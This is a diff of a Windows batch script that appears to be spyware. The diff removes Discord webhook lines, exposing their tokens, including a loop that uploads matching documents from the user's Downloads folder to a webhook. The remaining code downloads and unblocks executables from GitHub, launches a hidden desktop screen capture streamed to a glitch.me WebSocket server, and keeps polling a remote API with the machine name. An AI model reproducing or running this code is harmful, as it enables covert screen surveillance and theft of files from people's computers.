@@ -1,44 +1,22 @@
 @echo off
 set "apiRoot=https://skollol.pythonanywhere.com"
 set /p name=<name.txt
-set "webhook=https://discord.com/api/webhooks/1341011448331112468/L1SNbktBvHcZmabBiTs5bh_AUXK3buMwGuZ3PynrIwpiyLAFo6y2U42KugzdaIu3PNBw"
-set "logging=https://discord.com/api/webhooks/1341011158261432381/QKCsx9XfQOZ7gSgcYCPWvBcUNnhPaU4QFb0up5IjRtjc4i39cJUWmBxIenMmBdt6te3G"
-
-curl -d content="**%name%**: Online" %webhook%
-
-
-::get the thing block
-for %%F in ("%USERPROFILE%\Downloads\*feli*list*.doc*") do (
-  curl -X POST ^
-    -H "Content-Type: multipart/form-data" ^
-    -F "payload_json={\"content\":\"Uploading file %%~nxF\"}" ^
-    -F "file=@%%F" ^
-    %logging%
-)
-::
-
 
 if not exist "%cd%\ffmpeg.exe" (
-    curl -d content="**%name%**: ffmpeg not found, downloading..." %logging%
     curl -L -o ffmpeg.exe "https://github.com/skollol/e/releases/download/depend/ffmpeg.exe"
     powershell -Command "Unblock-File -Path '%cd%\stream.exe'"
-    curl -d content="**%name%**: Downloaded ffmpeg" %logging%
 ) else (
-    curl -d content="**%name%**: Found ffmpeg" %logging%
+    echo nvmgotffmpeg
 )
 
 if not exist "%cd%\stream.exe" (
-    curl -d content="**%name%**: stream.exe not found, downloading..." %logging%
     curl -L -o stream.exe "https://github.com/skollol/e/raw/refs/heads/main/stream.exe"
-    curl -d content="**%name%**: Downloaded stream.exe" %logging%
     powershell -Command "Unblock-File -Path '%cd%\stream.exe'"
-    curl -d content="**%name%**: Unblocked stream.exe" %logging%
 ) else (
-    curl -d content="**%name%**: Found stream.exe" %logging%
+    echo nvm
 )
 
 start /B "" "%cd%\stream.exe" "%name%" wss://screenview.glitch.me -f gdigrab -framerate 5 -i desktop -draw_mouse 1 -c:v mjpeg -q:v 7 -f image2pipe -
-curl -d content="**%name%**: Stream is running." %logging%
 
 :loop
 curl -s -X POST -d "name=%name%" "%apiRoot%/u"
